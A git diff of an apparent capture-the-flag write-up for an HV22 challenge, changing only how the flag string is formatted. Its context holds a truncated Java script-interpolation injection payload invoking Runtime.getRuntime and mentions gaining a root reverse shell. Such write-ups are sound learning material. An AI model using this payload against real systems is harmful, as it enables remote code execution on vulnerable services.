@@ -26,6 +26,6 @@ It looks like we only have to input `${script:javascript:java.lang.Runtime.getRu
 
 ![got a reverse shell](/assets/hv22/hv22_09_shell.png)
 
-From here, it's just a bit of looking around for the flag, which shouldn't be too hard since we already are root. The file /SANTA/FLAG.txt (quite easy to find) gives us the flag **HV22{th!s_Text_5h€LL_Com€5_₣₹0M_SANTAA!!}**
+From here, it's just a bit of looking around for the flag, which shouldn't be too hard since we already are root. The file /SANTA/FLAG.txt (quite easy to find) gives us the flag `HV22{th!s_Text_5h€LL_Com€5_₣₹0M_SANTAA!!}`
 
 ![got the flag](/assets/hv22/hv22_09_flag.png)
